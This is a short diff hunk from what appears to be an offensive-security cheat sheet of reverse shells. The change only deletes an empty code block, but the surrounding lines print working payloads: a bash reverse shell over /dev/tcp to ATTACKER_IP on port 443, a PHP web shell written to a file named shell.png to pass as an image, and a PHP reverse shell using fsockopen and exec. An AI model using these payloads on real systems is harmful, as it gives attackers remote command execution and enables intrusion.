@@ -24,9 +24,6 @@ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
 echo '<?php if(isset($_REQUEST["cmd"])) system($_REQUEST["cmd"]); ?>' > shell.png
 ```
 
-
-  ```
-
 - PHP Reverse Shell Using the exec Function
 ```bash
 php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
